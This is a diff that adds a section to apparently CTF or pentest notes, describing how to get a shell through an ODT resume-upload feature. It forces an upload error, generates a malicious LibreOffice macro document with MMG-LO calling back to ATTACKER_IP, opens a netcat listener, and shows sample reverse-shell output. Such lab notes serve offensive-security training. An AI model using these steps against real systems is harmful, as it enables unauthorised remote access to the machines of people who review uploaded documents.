@@ -400,6 +400,36 @@ ffuf -w /usr/share/seclists/Discovery/Web-Content/common.txt:FUZZ \
 /profile_images/
 ```
 
+### ODT Resume Uploads
+
+If a site accepts only `.odt` resumes and says the upload will be reviewed, check whether the target opens the document with LibreOffice.
+
+Force an upload handler error to identify the backend, web root, and allowed file type:
+
+```text
+http://TARGET/upload.php
+
+Warning: Undefined array key "file" in C:\xampp\htdocs\upload.php
+File is not valid. Please submit ODT file
+```
+
+Generate a malicious ODT macro document with MMG-LO:
+
+```bash
+git clone https://github.com/0bfxgh0st/MMG-LO.git
+python3 mmg-odt.py windows ATTACKER_IP 80
+nc -nlvp 80
+```
+
+Upload the generated `.odt`. A successful reviewed-document shell may land inside LibreOffice:
+
+```text
+connect to [ATTACKER_IP] from (UNKNOWN) [TARGET] PORT
+whoami
+craft\thecybergeek
+PS C:\Program Files\LibreOffice\program>
+```
+
 ### Force Errors
 
 - Upload file with duplicate name
